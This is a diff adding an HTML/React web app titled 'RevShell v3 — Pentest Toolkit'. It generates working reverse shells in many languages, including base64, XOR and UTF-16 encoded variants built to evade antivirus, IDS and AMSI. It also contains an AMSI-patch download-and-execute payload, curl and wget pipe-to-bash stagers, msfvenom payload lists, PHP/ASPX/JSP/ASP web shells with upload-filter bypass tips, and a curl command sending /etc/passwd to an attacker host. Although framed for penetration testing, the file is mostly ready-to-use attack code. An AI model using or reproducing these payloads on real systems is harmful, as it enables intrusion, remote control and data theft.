@@ -1,0 +1,1856 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>RevShell v3 — Pentest Toolkit</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/react/18.2.0/umd/react.production.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/18.2.0/umd/react-dom.production.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/7.23.2/babel.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body,#root{height:100%}
+  body{background:#060c06}
+  ::-webkit-scrollbar{width:5px;height:5px}
+  ::-webkit-scrollbar-track{background:#060c06}
+  ::-webkit-scrollbar-thumb{background:#1a2a1a;border-radius:3px}
+  input[type=range]::-webkit-slider-runnable-track{background:#1a2a1a;height:4px;border-radius:2px}
+  input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:14px;height:14px;border-radius:50%;background:#00ffaa;margin-top:-5px;cursor:pointer}
+  select option{background:#0a140a;color:#b8ccb8}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  @keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+  .light-mode{filter:invert(1) hue-rotate(180deg)}
+  .light-mode img,.light-mode video,.light-mode canvas{filter:invert(1) hue-rotate(180deg)}
+</style>
+</head>
+<body>
+<div id="root"></div>
+<script type="text/babel">
+const {useState,useMemo,useCallback,useEffect,useRef,createContext,useContext}=React;
+
+/* ══════════════════════════════════════════════════════
+   LOCALSTORE HOOK
+══════════════════════════════════════════════════════ */
+function useLS(key,def){
+  const[v,setV]=useState(()=>{try{const s=localStorage.getItem(key);return s!==null?JSON.parse(s):def;}catch{return def;}});
+  useEffect(()=>{try{localStorage.setItem(key,JSON.stringify(v));}catch{}},[key,v]);
+  return[v,setV];
+}
+
+/* ══════════════════════════════════════════════════════
+   SHELL REGISTRY
+══════════════════════════════════════════════════════ */
+const SHELLS_BASE=[
+  {id:"bash-tcp",name:"Bash TCP",cat:"bash",os:["linux","macos"],stealth:2,tags:["tcp","classic"],
+   info:"Standard Bash /dev/tcp reverse shell",
+   req:"/bin/bash with /dev/tcp support (disabled in some hardened builds)",
+   pair:"nc -lvnp PORT  or  rlwrap nc -lvnp PORT",
+   caveat:"Alpine Linux strips /dev/tcp. Test: bash -c 'echo ok>/dev/tcp/127.0.0.1/80' 2>/dev/null",
+   gen:({ip,port})=>`bash -i >& /dev/tcp/${ip}/${port} 0>&1`},
+  {id:"bash-udp",name:"Bash UDP",cat:"bash",os:["linux"],stealth:3,tags:["udp","firewall-bypass"],
+   info:"Bypasses TCP-only firewalls via /dev/udp",
+   req:"/bin/bash with /dev/udp support",pair:"nc -ulvnp PORT",
+   caveat:"UDP is connectionless — listener MUST start before the shell fires.",
+   gen:({ip,port})=>`bash -i >& /dev/udp/${ip}/${port} 0>&1`},
+  {id:"bash-fd196",name:"Bash FD-196",cat:"bash",os:["linux"],stealth:3,tags:["fd","obfuscated"],
+   info:"File descriptor 196 — avoids literal /dev/tcp string in argv",
+   req:"/bin/bash",pair:"nc -lvnp PORT",
+   caveat:"Some IDS still catches /dev/tcp in exec call. Combine with Base64 for full evasion.",
+   gen:({ip,port})=>`0<&196;exec 196<>/dev/tcp/${ip}/${port};bash <&196 >&196 2>&196`},
+  {id:"bash-loop",name:"Bash Read Loop",cat:"bash",os:["linux","macos"],stealth:4,tags:["loop","stealth"],
+   info:"No -i flag — cleaner process listing, harder to spot",
+   req:"/bin/bash",pair:"nc -lvnp PORT",
+   caveat:"No PTY — upgrade with Python pty after connection.",
+   gen:({ip,port})=>`exec 5<>/dev/tcp/${ip}/${port};cat <&5|while read l;do $l 2>&5 >&5;done`},
+  {id:"bash-b64",name:"Bash Base64",cat:"bash",os:["linux","macos"],stealth:5,tags:["encoded","evasion","av-bypass"],
+   info:"Base64-encoded — evades string-based AV and HIDS signatures",
+   req:"/bin/bash + base64 binary",pair:"nc -lvnp PORT",
+   caveat:"Payload re-encodes live as you type. Verify the decoded string before running.",
+   gen:({ip,port})=>`echo ${btoa(`bash -i >& /dev/tcp/${ip}/${port} 0>&1`)}|base64 -d|bash`},
+  {id:"bash-ipv6",name:"Bash IPv6",cat:"bash",os:["linux"],stealth:4,tags:["ipv6","firewall-bypass","2026"],
+   info:"IPv6 /dev/tcp shell — bypasses IPv4-only firewall rules entirely",
+   req:"/bin/bash + IPv6 connectivity between attacker and target",
+   pair:"nc -6 -lvnp PORT",
+   caveat:"Use your actual IPv6 addr. Link-local needs interface suffix e.g. fe80::1%eth0. Run 'ip -6 addr' to find it.",
+   gen:({ip,port})=>{const v6=ip.includes(":")?`[${ip}]`:ip;return`bash -i >& /dev/tcp/${v6}/${port} 0>&1`;}},
+  {id:"bash-xor",name:"Bash XOR Encoded",cat:"bash",os:["linux","macos"],stealth:5,tags:["xor","encoded","av-bypass","2026"],
+   info:"XOR-encoded at key 0x41 — evades static string scanning, decoded at runtime",
+   req:"/bin/bash + python3 (for decode stage)",
+   pair:"nc -lvnp PORT",
+   caveat:"Change key 0x41 for real ops. Python3 is required for the decode stage.",
+   gen:({ip,port})=>{
+     const plain=`bash -i >& /dev/tcp/${ip}/${port} 0>&1`,key=0x41;
+     const xored=Array.from(plain).map(c=>(c.charCodeAt(0)^key).toString(16).padStart(2,"0")).join("");
+     return`python3 -c "import subprocess;d=bytes.fromhex('${xored}');c=bytes([b^${key} for b in d]);subprocess.run(['bash','-c',c.decode()])"`;}},
+  {id:"py3-socket",name:"Python3 Socket",cat:"python",os:["linux","macos","windows"],stealth:3,tags:["socket","cross-platform"],
+   info:"Cross-platform Python3 socket shell",
+   req:"python3 (check: which python3)",pair:"nc -lvnp PORT",
+   caveat:"No PTY — use the PTY variant for full interactivity.",
+   gen:({ip,port})=>`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`},
+  {id:"py3-pty",name:"Python3 PTY",cat:"python",os:["linux","macos"],stealth:3,tags:["pty","interactive","tty"],
+   info:"Full interactive TTY via pty.spawn — best Python shell",
+   req:"python3 (pty module is built-in)",pair:"rlwrap nc -lvnp PORT",
+   caveat:"Substitute /bin/sh if /bin/bash is absent.",
+   gen:({ip,port})=>`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'`},
+  {id:"py3-ssl",name:"Python3 SSL",cat:"python",os:["linux","macos"],stealth:5,tags:["ssl","encrypted","evasion"],
+   info:"SSL-wrapped — traffic resembles HTTPS, evades DPI",
+   req:"python3 ssl module (built-in) + cert on attacker side",pair:"ncat --ssl -lvnp PORT",
+   caveat:"Generate cert first: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes",
+   gen:({ip,port})=>`python3 -c 'import ssl,socket,os,pty;s=ssl.wrap_socket(socket.socket());s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`},
+  {id:"py2-socket",name:"Python2 Socket",cat:"python",os:["linux","macos"],stealth:3,tags:["legacy","python2"],
+   info:"Python2 fallback for older systems",
+   req:"python2 (check: which python)",pair:"nc -lvnp PORT",
+   caveat:"Python 2 is EOL. Only use when python3 is absent.",
+   gen:({ip,port})=>`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'`},
+  {id:"php-exec",name:"PHP exec()",cat:"php",os:["linux","windows"],stealth:2,tags:["web","rce"],
+   info:"Classic PHP exec() via fsockopen",
+   req:"PHP with exec() and fsockopen() not in disable_functions",pair:"nc -lvnp PORT",
+   caveat:"Check: php -r 'echo ini_get(\"disable_functions\");'",
+   gen:({ip,port})=>`php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`},
+  {id:"php-proc",name:"PHP proc_open()",cat:"php",os:["linux","windows"],stealth:2,tags:["web","proc"],
+   info:"proc_open() — survives some disable_functions blacklists",
+   req:"PHP with proc_open() enabled",pair:"nc -lvnp PORT",
+   caveat:"If both exec and proc_open fail, try pcntl_exec() or mail() tricks.",
+   gen:({ip,port})=>`php -r '$s=fsockopen("${ip}",${port});$p=proc_open("/bin/sh -i",array(0=>$s,1=>$s,2=>$s),$pipes);'`},
+  {id:"php-b64",name:"PHP Base64",cat:"php",os:["linux","windows"],stealth:4,tags:["encoded","waf-bypass"],
+   info:"Base64-obfuscated PHP — bypasses simple WAF string matching",
+   req:"PHP with eval() and base64_decode() enabled",pair:"nc -lvnp PORT",
+   caveat:"eval() is often disabled on hardened PHP. WAFs increasingly detect b64 PHP patterns.",
+   gen:({ip,port})=>`php -r 'eval(base64_decode("${btoa(`$s=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");`)}"));'`},
+  {id:"ps-tcp",name:"PowerShell TCP",cat:"powershell",os:["windows"],stealth:3,tags:["windows","tcp","dotnet"],
+   info:"PowerShell .NET TCPClient reverse shell",
+   req:"PowerShell 2.0+ (all modern Windows, no admin needed)",pair:"rlwrap nc -lvnp PORT",
+   caveat:"CLM will break this. AMSI may flag. ExecutionPolicy does NOT block -c flag.",
+   gen:({ip,port})=>`powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`},
+  {id:"ps-enc",name:"PowerShell -enc",cat:"powershell",os:["windows"],stealth:5,tags:["windows","encoded","amsi-bypass"],
+   info:"UTF-16LE base64 — bypasses command-line logging and basic AMSI",
+   req:"PowerShell 2.0+. -enc requires UTF-16LE (not standard base64).",pair:"nc -lvnp PORT",
+   caveat:"Script block logging (Event 4104) still decodes in PS5+. Combine with AMSI patch for deeper evasion.",
+   gen:({ip,port})=>{
+     const cmd=`$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()`;
+     const utf16=[];for(let i=0;i<cmd.length;i++){utf16.push(cmd.charCodeAt(i)&0xff,(cmd.charCodeAt(i)>>8)&0xff);}
+     return`powershell -enc ${btoa(String.fromCharCode(...utf16))}`;}},
+  {id:"ps-amsi",name:"PowerShell AMSI Bypass",cat:"powershell",os:["windows"],stealth:5,tags:["windows","amsi-bypass","reflection","2026"],
+   info:"Patches amsiInitFailed via .NET reflection then loads payload — bypasses runtime AMSI",
+   req:"PowerShell 5+ (standard on all Win10/Server 2016+). Host shell.ps1 at IP:PORT.",pair:"python3 -m http.server PORT",
+   caveat:"ETW may still log. Script block logging (4104) captures post-patch. Use with ETW bypass for full evasion.",
+   gen:({ip,port})=>`powershell -nop -c "[R]=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$F=[R].GetField('amsiInitFailed','NonPublic,Static');$F.SetValue($null,$true);iex(New-Object Net.WebClient).DownloadString('http://${ip}:${port}/shell.ps1')"`},
+  {id:"ps-https",name:"PowerShell HTTPS",cat:"powershell",os:["windows"],stealth:5,tags:["windows","https","stager"],
+   info:"Downloads and executes remote payload over HTTPS",
+   req:"PowerShell + outbound HTTPS. Must host shell.ps1 at IP:PORT.",pair:"python3 -m http.server PORT",
+   caveat:"Add TrustAllCerts policy if using self-signed cert.",
+   gen:({ip,port})=>`powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://${ip}:${port}/shell.ps1')"`},
+  {id:"nc-e",name:"Netcat -e",cat:"netcat",os:["linux","macos"],stealth:1,tags:["classic","simple"],
+   info:"Classic netcat with -e flag",
+   req:"netcat WITH -e support. Check: nc --help 2>&1 | grep -e '-e'",pair:"nc -lvnp PORT",
+   caveat:"Modern distros ship OpenBSD nc WITHOUT -e. Use mkfifo as fallback.",
+   gen:({ip,port})=>`nc -e /bin/sh ${ip} ${port}`},
+  {id:"nc-mkfifo",name:"Netcat mkfifo",cat:"netcat",os:["linux"],stealth:2,tags:["fifo","no-e"],
+   info:"Named FIFO pipe — works on all netcat versions",
+   req:"netcat (any version) + mkfifo",pair:"nc -lvnp PORT",
+   caveat:"Creates /tmp/f on target. Clean up: rm /tmp/f. Use /dev/shm if /tmp is noexec.",
+   gen:({ip,port})=>`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`},
+  {id:"ncat-ssl",name:"Ncat SSL",cat:"netcat",os:["linux","windows"],stealth:4,tags:["ssl","nmap","encrypted"],
+   info:"Ncat (Nmap suite) with SSL — encrypted channel",
+   req:"ncat (apt install nmap)",pair:"ncat --ssl -lvnp PORT",
+   caveat:"ncat ≠ nc. Verify: ncat --version",
+   gen:({ip,port})=>`ncat --ssl ${ip} ${port} -e /bin/bash`},
+  {id:"socat-tcp",name:"Socat TCP+PTY",cat:"socat",os:["linux","macos"],stealth:3,tags:["pty","tty","interactive"],
+   info:"Best interactive shell quality — full PTY with signal handling",
+   req:"socat on target (apt install socat)",pair:"socat file:`tty`,raw,echo=0 TCP-LISTEN:PORT",
+   caveat:"Rarely pre-installed — must be uploaded first.",
+   gen:({ip,port})=>`socat TCP:${ip}:${port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`},
+  {id:"socat-ssl",name:"Socat SSL+PTY",cat:"socat",os:["linux"],stealth:5,tags:["ssl","encrypted","pty"],
+   info:"Encrypted interactive shell — gold standard for quality + evasion",
+   req:"socat with OpenSSL. Check: socat -V | grep OPENSSL",
+   pair:"socat OPENSSL-LISTEN:PORT,cert=cert.pem,key=key.pem,verify=0,fork -",
+   caveat:"Generate cert first (see SSL Tools). Both sides need SSL configured.",
+   gen:({ip,port})=>`socat OPENSSL:${ip}:${port},verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`},
+  {id:"go-tcp",name:"Go TCP",cat:"go",os:["linux","windows","macos"],stealth:4,tags:["compiled","cross-platform","2026"],
+   info:"Writes, compiles and runs Go binary — no interpreter footprint",
+   req:"Go toolchain (which go). Common in CI/DevOps environments.",pair:"nc -lvnp PORT",
+   caveat:"Clean up: rm /tmp/r.go /tmp/r after session.",
+   gen:({ip,port})=>`echo 'package main;import("net","os/exec");func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}'>/tmp/r.go&&go run /tmp/r.go`},
+  {id:"rust-tcp",name:"Rust TCP",cat:"rust",os:["linux","windows"],stealth:4,tags:["compiled","modern","2026"],
+   info:"Rust binary — very low AV detection, no runtime deps after compile",
+   req:"rustc (which rustc). 5-15s compile delay expected.",pair:"nc -lvnp PORT",
+   caveat:"Add -C strip=symbols for smaller binary. Clean up /tmp/r.rs /tmp/r after use.",
+   gen:({ip,port})=>`cat>/tmp/r.rs<<'E'\nuse std::net::TcpStream;\nuse std::os::unix::io::AsRawFd;\nuse std::process::Command;\nfn main(){let s=TcpStream::connect("${ip}:${port}").unwrap();let f=s.as_raw_fd();Command::new("/bin/sh").arg("-i").stdin(unsafe{std::fs::File::from_raw_fd(f)}).stdout(unsafe{std::fs::File::from_raw_fd(f)}).stderr(unsafe{std::fs::File::from_raw_fd(f)}).spawn().unwrap().wait().unwrap();}\nE\nrustc /tmp/r.rs -o /tmp/r&&/tmp/r`},
+  {id:"node-tcp",name:"Node.js TCP",cat:"nodejs",os:["linux","windows","macos"],stealth:3,tags:["javascript","web-server"],
+   info:"Node.js child_process — ubiquitous on web servers",
+   req:"node binary (which node)",pair:"nc -lvnp PORT",
+   caveat:"On Windows change /bin/sh to cmd.exe in spawn call.",
+   gen:({ip,port})=>`node -e 'var n=require("net"),c=require("child_process"),s=new n.Socket();s.connect(${port},"${ip}",()=>{var sh=c.spawn("/bin/sh",["-i"]);sh.stdin.pipe(s);s.pipe(sh.stdout);s.pipe(sh.stderr)})'`},
+  {id:"ruby-tcp",name:"Ruby TCP",cat:"ruby",os:["linux","macos"],stealth:3,tags:["ruby","rails"],
+   info:"Ruby TCPSocket — common in Rails/Sinatra environments",
+   req:"ruby (which ruby)",pair:"nc -lvnp PORT",
+   caveat:"Test socket support: ruby -rsocket -e 'puts TCPSocket.class'",
+   gen:({ip,port})=>`ruby -rsocket -e 'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`},
+  {id:"perl-tcp",name:"Perl TCP",cat:"perl",os:["linux","macos"],stealth:3,tags:["perl","legacy"],
+   info:"Perl socket — pre-installed on almost every Unix system",
+   req:"perl (which perl) — usually pre-installed",pair:"nc -lvnp PORT",
+   caveat:"Best fallback when bash/python/nc are all unavailable.",
+   gen:({ip,port})=>`perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")'`},
+  {id:"java-rt",name:"Java Runtime",cat:"java",os:["linux","windows","macos"],stealth:3,tags:["java","enterprise","jenkins"],
+   info:"Java Runtime.exec() — primary technique for JEE/Jenkins RCE",
+   req:"Java JRE. Groovy syntax works in Jenkins Script Console.",pair:"nc -lvnp PORT",
+   caveat:"Jenkins Script Console is the #1 use case. Adapt syntax for pure Java.",
+   gen:({ip,port})=>`r=Runtime.getRuntime()\np=r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5|while read l;do $l 2>&5 >&5;done"] as String[])\np.waitFor()`},
+  {id:"curl-exec",name:"cURL Stager",cat:"web",os:["linux","macos"],stealth:4,tags:["curl","stager","fileless","2026"],
+   info:"Pipe-execute from HTTP — fileless, no disk write",
+   req:"curl + you host shell at http://IP:PORT/s.sh",pair:"python3 -m http.server PORT",
+   caveat:"Target needs outbound HTTP. Script is piped directly to bash — never touches disk.",
+   gen:({ip,port})=>`curl -s http://${ip}:${port}/s.sh|bash`},
+  {id:"wget-exec",name:"wget Stager",cat:"web",os:["linux"],stealth:4,tags:["wget","stager","fileless"],
+   info:"wget pipe-execute — use when curl is absent",
+   req:"wget + hosted shell script",pair:"python3 -m http.server PORT",
+   caveat:"If wget missing: /usr/bin/fetch (BSD) or python3 urllib one-liner.",
+   gen:({ip,port})=>`wget -qO- http://${ip}:${port}/s.sh|bash`},
+  {id:"lst-nc",name:"Netcat",cat:"listener",os:["linux","macos"],stealth:null,tags:["basic"],
+   info:"Basic netcat listener",req:"netcat on attacker",pair:"Pair with: any TCP shell",
+   caveat:"Ctrl+C kills listener not just shell. Add rlwrap for arrow keys.",
+   gen:({port})=>`nc -lvnp ${port}`},
+  {id:"lst-rlwrap",name:"rlwrap + nc",cat:"listener",os:["linux"],stealth:null,tags:["history","arrow-keys"],
+   info:"rlwrap adds history and arrow keys to netcat",
+   req:"rlwrap (apt install rlwrap)",pair:"Pair with: any TCP shell",
+   caveat:"rlwrap only helps attacker side — still need to upgrade shell for full PTY.",
+   gen:({port})=>`rlwrap nc -lvnp ${port}`},
+  {id:"lst-ncat-ssl",name:"Ncat SSL Listener",cat:"listener",os:["linux"],stealth:null,tags:["ssl","encrypted"],
+   info:"SSL listener — pair with SSL shells",
+   req:"ncat + cert.pem + key.pem",pair:"Pair with: Ncat SSL or Python3 SSL",
+   caveat:"Files must be in current directory.",
+   gen:({port})=>`ncat --ssl --ssl-key key.pem --ssl-cert cert.pem -lvnp ${port}`},
+  {id:"lst-socat",name:"Socat SSL+PTY",cat:"listener",os:["linux"],stealth:null,tags:["ssl","pty","best-listener"],
+   info:"Best listener: encrypted + full interactive PTY",
+   req:"socat with SSL + cert.pem + key.pem",pair:"Pair with: Socat SSL+PTY shell",
+   caveat:"The gold standard setup. Encryption + tab completion + signals in one command.",
+   gen:({port})=>`socat OPENSSL-LISTEN:${port},cert=cert.pem,key=key.pem,verify=0,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`},
+];
+
+/* ══════════════════════════════════════════════════════
+   MSFVENOM DATA
+══════════════════════════════════════════════════════ */
+const MSF_PAYLOADS={
+  linux:[
+    {id:"linux/x86/shell_reverse_tcp",label:"Linux x86 Shell (staged)",arch:"x86",staged:true},
+    {id:"linux/x64/shell_reverse_tcp",label:"Linux x64 Shell (staged)",arch:"x64",staged:true},
+    {id:"linux/x64/shell/reverse_tcp",label:"Linux x64 Shell Stageless",arch:"x64",staged:false},
+    {id:"linux/x86/meterpreter/reverse_tcp",label:"Linux x86 Meterpreter",arch:"x86",staged:true},
+    {id:"linux/x64/meterpreter/reverse_tcp",label:"Linux x64 Meterpreter",arch:"x64",staged:true},
+    {id:"linux/x64/meterpreter_reverse_tcp",label:"Linux x64 Meterpreter (inline)",arch:"x64",staged:false},
+  ],
+  windows:[
+    {id:"windows/x64/shell_reverse_tcp",label:"Windows x64 Shell (staged)",arch:"x64",staged:true},
+    {id:"windows/x64/meterpreter/reverse_tcp",label:"Windows x64 Meterpreter",arch:"x64",staged:true},
+    {id:"windows/x64/meterpreter/reverse_https",label:"Windows x64 Meterpreter HTTPS",arch:"x64",staged:true},
+    {id:"windows/meterpreter/reverse_tcp",label:"Windows x86 Meterpreter",arch:"x86",staged:true},
+    {id:"windows/meterpreter/reverse_https",label:"Windows x86 Meterpreter HTTPS",arch:"x86",staged:true},
+    {id:"windows/powershell_reverse_tcp",label:"Windows PowerShell",arch:"x86",staged:true},
+    {id:"windows/x64/exec",label:"Windows x64 Exec (custom cmd)",arch:"x64",staged:false},
+  ],
+  macos:[
+    {id:"osx/x64/shell_reverse_tcp",label:"macOS x64 Shell",arch:"x64",staged:true},
+    {id:"osx/x64/meterpreter_reverse_tcp",label:"macOS x64 Meterpreter",arch:"x64",staged:false},
+  ],
+  web:[
+    {id:"php/reverse_php",label:"PHP Reverse Shell",arch:"php",staged:false},
+    {id:"php/meterpreter_reverse_tcp",label:"PHP Meterpreter",arch:"php",staged:false},
+    {id:"java/jsp_shell_reverse_tcp",label:"JSP Shell",arch:"java",staged:false},
+    {id:"python/shell_reverse_tcp",label:"Python Shell",arch:"py",staged:false},
+    {id:"python/meterpreter/reverse_tcp",label:"Python Meterpreter",arch:"py",staged:true},
+  ],
+};
+const MSF_FORMATS={
+  linux:[{id:"elf",label:"ELF Binary",ext:".elf",note:"Standard Linux executable"},{id:"elf-so",label:"Shared Lib (.so)",ext:".so",note:"Load with LD_PRELOAD"},{id:"raw",label:"Raw Shellcode",ext:".bin",note:"Inject directly"},{id:"c",label:"C Array",ext:".c",note:"Embed in C source"},{id:"python",label:"Python",ext:".py",note:"Python script"},{id:"bash",label:"Bash",ext:".sh",note:"Bash script"}],
+  windows:[{id:"exe",label:"PE Executable",ext:".exe",note:"Standard Windows binary"},{id:"exe-service",label:"Service EXE",ext:".exe",note:"Windows service binary"},{id:"dll",label:"DLL",ext:".dll",note:"Sideload or inject"},{id:"ps1",label:"PowerShell",ext:".ps1",note:"PS script"},{id:"hta",label:"HTA",ext:".hta",note:"Runs via mshta.exe"},{id:"msi",label:"MSI Package",ext:".msi",note:"Installer hijack"},{id:"raw",label:"Raw Shellcode",ext:".bin",note:"For injection"},{id:"c",label:"C Array",ext:".c",note:"Embed in C"}],
+  macos:[{id:"macho",label:"Mach-O Binary",ext:"",note:"macOS native"},{id:"raw",label:"Raw Shellcode",ext:".bin",note:"Raw bytes"}],
+  web:[{id:"raw",label:"Raw",ext:"",note:"Save with correct extension"}],
+};
+const MSF_ENCODERS=[
+  {id:"none",label:"None"},
+  {id:"x86/shikata_ga_nai",label:"shikata_ga_nai (x86) — polymorphic XOR"},
+  {id:"x64/zutto_dekiru",label:"zutto_dekiru (x64)"},
+  {id:"x86/call4_dword_xor",label:"call4_dword_xor (x86)"},
+  {id:"x86/alpha_mixed",label:"alpha_mixed — alphanumeric only"},
+];
+
+/* ══════════════════════════════════════════════════════
+   WEB SHELLS
+══════════════════════════════════════════════════════ */
+const WEB_SHELLS=[
+  {id:"php-simple",name:"PHP Simple CMD",lang:"php",stealth:1,filename:"shell.php",description:"One-liner — smallest possible PHP footprint",usage:"GET: http://target/shell.php?cmd=id",detection:"Extremely detectable — obvious system() in source",upload_tip:"Try .php5 .phtml .phar .shtml if .php is blocked",code:`<?php system($_GET['cmd']); ?>`},
+  {id:"php-eval",name:"PHP Eval (POST)",lang:"php",stealth:2,filename:"cmd.php",description:"eval() with POST parameter — stays out of GET logs",usage:"POST: curl -X POST http://target/cmd.php -d 'x=id'",detection:"eval() + POST param caught by most WAFs and PHP scanners",upload_tip:"Use multipart upload if direct POST is blocked",code:`<?php @eval(base64_decode($_POST['x'])); ?>`},
+  {id:"php-passthru",name:"PHP Passthru",lang:"php",stealth:2,filename:"pt.php",description:"passthru() — different function to evade exec blacklists",usage:"GET: http://target/pt.php?c=id",detection:"passthru() flagged by most AV scanners",upload_tip:"Try .php3 or .php4 extension if .php is blocked",code:`<?php passthru($_GET['c']); ?>`},
+  {id:"php-obfuscated",name:"PHP Variable Func",lang:"php",stealth:4,filename:"img.php",description:"Variable function call — bypasses simple string scanners",usage:"GET: http://target/img.php?0=system&1=id",detection:"Moderate — variable function pattern flagged by deep scanners",upload_tip:"Prepend JPEG magic bytes (\\xff\\xd8\\xff) to bypass MIME checks",code:`<?php $f=$_GET[0];$f($_GET[1]); ?>`},
+  {id:"php-reverse",name:"PHP Full Reverse Shell",lang:"php",stealth:2,filename:"revshell.php",description:"Full pentestmonkey-style PHP reverse shell",usage:"Edit IP/PORT, upload, browse. Catch with: nc -lvnp PORT",detection:"Known signature — most AV detects it. Obfuscate for evasion.",upload_tip:"Change variable names and split strings to evade signature detection",code:`<?php
+$ip   = '__IP__';
+$port = __PORT__;
+$sock = fsockopen($ip, $port);
+$proc = proc_open('/bin/sh -i', [
+  0 => $sock, 1 => $sock, 2 => $sock
+], $pipes);
+?>`},
+  {id:"aspx-shell",name:"ASPX CMD Shell",lang:"aspx",stealth:2,filename:"shell.aspx",description:"Classic ASPX command shell for IIS / Windows targets",usage:"GET: http://target/shell.aspx?cmd=whoami",detection:"Well-known signature. Use for quick wins, not stealth ops.",upload_tip:"Try .ashx .asmx .asp if .aspx is blocked. Check web.config.",code:`<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<% var cmd=Request.QueryString["cmd"];
+   if(cmd!=null){
+     var p=new Process();
+     p.StartInfo.FileName="cmd.exe";
+     p.StartInfo.Arguments="/c "+cmd;
+     p.StartInfo.UseShellExecute=false;
+     p.StartInfo.RedirectStandardOutput=true;
+     p.Start();
+     Response.Write("<pre>"+p.StandardOutput.ReadToEnd()+"</pre>");
+   } %>`},
+  {id:"jsp-shell",name:"JSP CMD Shell",lang:"jsp",stealth:2,filename:"shell.jsp",description:"JSP command shell — Java app servers (Tomcat, JBoss, WebLogic)",usage:"GET: http://target/shell.jsp?cmd=id",detection:"Known pattern. Package as .war for Tomcat Manager upload.",upload_tip:"jar -cvf shell.war shell.jsp  →  upload via Tomcat Manager",code:`<%@ page import="java.io.*" %>
+<% String cmd=request.getParameter("cmd");
+   if(cmd!=null){
+     Process p=Runtime.getRuntime().exec(cmd);
+     InputStream is=p.getInputStream();
+     int c; while((c=is.read())!=-1) out.print((char)c);
+   } %>`},
+  {id:"asp-classic",name:"Classic ASP Shell",lang:"asp",stealth:2,filename:"shell.asp",description:"Classic ASP shell for legacy IIS 5/6 servers",usage:"GET: http://target/shell.asp?cmd=whoami",detection:"Very well known. Only useful against legacy servers (pre-IIS 7).",upload_tip:"IIS 7+ disabled classic ASP by default — check if asp.dll is registered",code:`<% Set o=Server.CreateObject("WScript.Shell")
+Set e=o.Exec(Request("cmd"))
+Response.Write("<pre>"&e.StdOut.ReadAll&"</pre>") %>`},
+];
+
+/* ══════════════════════════════════════════════════════
+   FILE TRANSFER
+══════════════════════════════════════════════════════ */
+const FILE_TRANSFER={
+  serve:[
+    {id:"py-http",name:"Python HTTP Server",os:["linux","macos"],tags:["http","simple","fast"],desc:"Quickest way to serve files from current directory over HTTP",req:"python3 on attacker",usage:"cd /path/to/files && python3 -m http.server PORT\nThen on target: wget http://ATTACKER:PORT/file.ext",note:"Serves current directory. No auth — only use on isolated lab networks."},
+    {id:"py-upload",name:"Python Upload Server",os:["linux","macos"],tags:["http","upload","receive"],desc:"Receive files FROM the target — python3 -m uploadserver",req:"pip install uploadserver on attacker",usage:"python3 -m uploadserver PORT\nThen on target:\ncurl -F 'files=@/etc/passwd' http://ATTACKER:PORT/upload",note:"Install first: pip3 install uploadserver --break-system-packages"},
